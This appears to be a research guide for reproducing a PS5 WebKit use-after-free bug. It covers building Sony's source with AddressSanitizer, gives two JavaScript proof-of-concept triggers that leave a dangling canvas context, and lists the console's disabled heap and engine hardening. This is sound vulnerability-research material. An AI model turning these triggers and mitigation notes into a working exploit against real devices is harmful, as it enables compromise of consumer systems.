# Local Reproduction Guide — PS5 WebKit Research

**Purpose:** Help contributors reproduce bugs locally using Sony's source drop + ASan.  
**Source:** `WebKit_1400.zip` from https://www.playstation.com/en-us/oss/ps5/webkit/

---

## Prerequisites

| Tool | Version | Notes |
|---|---|---|
| Clang/LLVM | 15+ | `winget install LLVM.LLVM` |
| CMake | 3.20+ | `winget install Kitware.CMake` |
| Perl | 5.30+ | Required for JSC codegen |
| Ruby | 3.0+ | Required for WebCore bindings |
| Python | 3.8+ | Already available |
| Git | 2.x | Already available |

**Note:** Full WebKit build on Windows requires MSVC + all above. A Linux VM or WSL is recommended.

---

## Step 1: Download source

```bash
# Download WebKit_1400.zip
wget https://www.playstation.com/content/dam/global_pdc/en-us/external-resources/oss/PS5/webkit/WebKit_1400.zip
unzip WebKit_1400.zip
cd WebKit-1400/WebKit-1400
```

## Step 2: Configure build (Linux/WSL recommended)

```bash
mkdir build && cd build
cmake .. \
  -DCMAKE_BUILD_TYPE=Debug \
  -DENABLE_JIT=OFF \
  -DENABLE_DFG_JIT=OFF \
  -DENABLE_FTL_JIT=OFF \
  -DENABLE_WEBGL=OFF \
  -DENABLE_WEBGPU=OFF \
  -DUSE_SYSTEM_MALLOC=OFF \
  -DENABLE_ASAN=ON \
  -DPORT=GTK
make -j$(nproc)
```

## Step 3: Reproduce CVE-2026-43720 (UAF)

Create a test HTML file:

```html
<!DOCTYPE html>
<html>
<body>
<script>
let canvas = document.createElement('canvas');
let innerCtx;
let outerCtx = canvas.getContext('2d', {
    get desynchronized() { innerCtx = canvas.getContext('2d'); return false; }
});
// Access stale wrapper
console.log("innerCtx.canvas =", innerCtx.canvas);
</script>
</body>
</html>
```

Run with MiniBrowser:
```bash
./bin/MiniBrowser test.html
```

Expected ASan output:
```
ERROR: AddressSanitizer: heap-use-after-free on address 0x...
READ of size 8
  #0 WebCore::CanvasRenderingContext::canvasBase() const
  #1 WebCore::CanvasRenderingContext2D::canvas() const
```

## Step 4: Reproduce with bitmaprenderer trigger

```html
<script>
var innerCtx;
var canvas = document.createElement('canvas');
var settings = {};
Object.defineProperty(settings, 'alpha', {
  get: function() { innerCtx = canvas.getContext('2d'); return true; }
});
var outerCtx = canvas.getContext('bitmaprenderer', settings);
// innerCtx is now dangling
console.log(innerCtx.lineWidth);
</script>
```

## Step 5: Measure layouts with clang

```bash
clang++ -Xclang -fdump-record-layouts -fsyntax-only \
  -I Source -I Source/WTF -I Source/WebCore -I Source/JavaScriptCore -I Source/bmalloc \
  -std=c++20 Source/WebCore/html/canvas/CanvasRenderingContext.h 2>&1 | grep -A5 "class CanvasRenderingContext"
```

## Step 6: Verify claims

| Claim | How to verify |
|---|---|
| IsoHeap OFF | Check `IsoMalloc.h:31` → `WTF_MAKE_ISO_ALLOCATED` → `WTF_MAKE_FAST_ALLOCATED` |
| JSC Config unfrozen | Check `VM.cpp:395` → `disableFreezingForTesting()` under `PLATFORM(PLAYSTATION)` |
| Gigacage disabled | Check `Gigacage::isEnabled()` at runtime (requires build) |
| BYOB absent | Check `ReadableStream` type:bytes not available in browser |

## Troubleshooting

- **Missing headers**: Extract full `Source/WebCore` and `Source/JavaScriptCore` from the zip.
- **DerivedSources not found**: Run the codegen scripts first (`make generate-bindings`).
- **ASan not triggering**: Ensure `ENABLE_ASAN=ON` and `CMAKE_BUILD_TYPE=Debug`.

---

*This guide is for defensive research and claim validation only.*
PY